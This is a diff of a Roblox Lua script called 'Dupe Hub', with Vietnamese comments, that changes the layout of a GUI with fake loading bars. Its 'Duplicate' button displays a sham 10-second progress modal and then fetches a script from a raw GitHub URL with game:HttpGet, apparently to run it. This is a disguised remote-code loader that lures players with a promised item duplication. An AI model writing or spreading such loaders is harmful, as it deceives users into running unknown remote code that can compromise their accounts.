@@ -1,4 +1,4 @@
--- Dupe Hub v2.3 (PlayerGui): giữ icon Roblox + loading đều tốc độ
+-- Dupe Hub v2.2 (PlayerGui): fix khoảng thừa phải & dưới nút Duplicate
 local Players = game:GetService("Players")
 local UIS = game:GetService("UserInputService")
 local TweenService = game:GetService("TweenService")
@@ -11,7 +11,7 @@ if old then old:Destroy() end
 
 local function pill(parent, text)
 	local b = Instance.new("TextButton")
-	b.Size = UDim2.new(1, -8, 1, -8)
+	b.Size = UDim2.new(1, -8, 1, -8) -- khít đều 4 phía
 	b.Position = UDim2.new(0, 4, 0, 4)
 	b.BackgroundColor3 = Color3.fromRGB(114, 106, 240)
 	b.Text = text
@@ -64,7 +64,12 @@ gui.IgnoreGuiInset = true
 gui.ZIndexBehavior = Enum.ZIndexBehavior.Global
 gui.Parent = PG
 
--- Loading box (8s, chạy đều)
+-- Loading box (8s)
+local bg = Instance.new("Frame", gui)
+bg.Size = UDim2.new(1, 0, 1, 0)
+bg.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+bg.BackgroundTransparency = 0.35
+
 local box = Instance.new("Frame", gui)
 box.AnchorPoint = Vector2.new(0.5, 0.5)
 box.Position = UDim2.new(0.5, 0, 0.5, 0)
@@ -105,8 +110,7 @@ fill.BackgroundColor3 = Color3.fromRGB(160, 90, 255)
 fill.BorderSizePixel = 0
 Instance.new("UICorner", fill).CornerRadius = UDim.new(0, 12)
 
--- Chạy đều từ đầu tới cuối (Linear)
-TweenService:Create(fill, TweenInfo.new(8, Enum.EasingStyle.Linear, Enum.EasingDirection.Out), {Size = UDim2.new(1, 0, 1, 0)}):Play()
+TweenService:Create(fill, TweenInfo.new(8, Enum.EasingStyle.Linear), {Size = UDim2.new(1, 0, 1, 0)}):Play()
 
 -- Main Hub
 local frame = Instance.new("Frame", gui)
@@ -136,13 +140,13 @@ t.TextColor3 = Color3.fromRGB(235, 235, 245)
 t.Text = "Dupe Hub"
 dragify(titleBar, frame)
 
--- Body
+-- Body khít nút
 local body = Instance.new("Frame", frame)
 body.BackgroundTransparency = 1
 body.Size = UDim2.new(1, -32, 0, 60)
 body.Position = UDim2.new(0, 16, 0, 64)
 
--- Hiệu ứng tiến trình đều (10s)
+-- Hiệu ứng tiến trình 10s
 local function ShowProgress10s()
 	if gui:FindFirstChild("KS_ProgressModal") then gui.KS_ProgressModal:Destroy() end
 	local modal = Instance.new("Frame", gui)
@@ -201,15 +205,14 @@ local function ShowProgress10s()
 	end)
 end
 
--- Nút 🧠 Duplicate
+-- Nút 🧠 Duplicate cân khít
 local btnDup2 = pill(body, "🧠 Duplicate")
 pillColor(btnDup2, 114, 106, 240)
 btnDup2.MouseButton1Click:Connect(function()
 	pcall(function()
 		btnDup2.Text = "🧠 Duplicate"
-		ShowProgress10s()
-		task.wait(10.8) -- đợi đúng khi progress đầy 100%
 		pillColor(btnDup2, 70, 200, 90)
+		ShowProgress10s()
 		local u = "https://raw.githubusercontent.com/tunadan212/Kkkk/refs/heads/main/K"
 		local s
 		pcall(function() s = game:HttpGet(u) end)
@@ -237,8 +240,9 @@ panel.MouseButton1Click:Connect(function()
 	frame.Visible = visible
 end)
 
--- Hiển thị sau khi thanh loading đầy
+-- Delay hiển thị
 task.delay(8, function()
+	bg:Destroy()
 	box:Destroy()
 	frame.Visible = true
 	panel.Visible = true
